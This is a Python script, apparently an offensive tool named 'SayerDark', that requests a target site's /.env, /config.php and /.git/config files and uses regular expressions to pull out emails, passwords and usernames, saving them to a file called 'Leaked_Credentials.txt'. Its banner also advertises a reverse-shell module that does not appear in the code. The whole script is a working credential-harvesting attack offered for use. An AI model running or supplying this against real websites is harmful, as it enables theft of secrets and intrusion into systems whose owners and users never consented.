import requests
import re
import os
import sys
import time
import socket

# الألوان للهيبة
G, R, Y, B, NC = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;34m', '\033[0m'

def banner():
    os.system('clear')
    print(f"""{G}
   _____                      _____                __    
  / ___/ ____ _ __  __ ___   / __  \ ____ _ _____ / /__  
  \__ \ / __ `// / / // _ \ / / / // __ `// ___// //_/  
 ___/ // /_/ // /_/ //  __// /_/ // /_/ // /   / ,<     
/____/ \__,_/ \__, / \___//_____/ \__,_//_/   /_/|_|    
             /____/                                      
{NC}--------------------------------------------------
{Y}[+] Developer: SayerLinux | Version: 3.0 Elite
[+] Modules: AI Discovery | Info Snatcher | Rev-Shell{NC}
--------------------------------------------------""")

def info_snatcher(content, source):
    patterns = {"Emails": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                "Passwords": r'(?i)(pass|pwd|secret|db_pass)\s*[:=]\s*([^\s"\'#]+)',
                "Users": r'(?i)(user|username|admin)\s*[:=]\s*([^\s"\'#]+)'}
    with open("Leaked_Credentials.txt", "a") as f:
        f.write(f"\n--- Source: {source} ---\n")
        for key, pattern in patterns.items():
            matches = re.findall(pattern, content)
            for match in set(matches):
                val = match[1] if isinstance(match, tuple) else match
                print(f"{G}[✔] Found {key}: {Y}{val}{NC}")
                f.write(f"{key}: {val}\n")

def scan_recon(url):
    print(f"\n{B}[*] Scanning Sensitive Paths...{NC}")
    paths = ["/.env", "/config.php", "/.git/config"]
    for path in paths:
        try:
            res = requests.get(url.rstrip('/') + path, timeout=5, verify=False)
            if res.status_code == 200:
                print(f"{G}[!] Path Found: {path}{NC}")
                info_snatcher(res.text, path)
        except: pass

def main():
    banner()
    print(f"{G}1.{NC} Full Recon & Snatching\n{G}2.{NC} Exit")
    cmd = input(f"\n{Y}[SayerDark]~#{NC} ")
    if cmd == '1':
        target = input(f"{G}[+] Target URL: {NC}")
        scan_recon(target)
    elif cmd == '2': sys.exit()

if __name__ == "__main__": main()
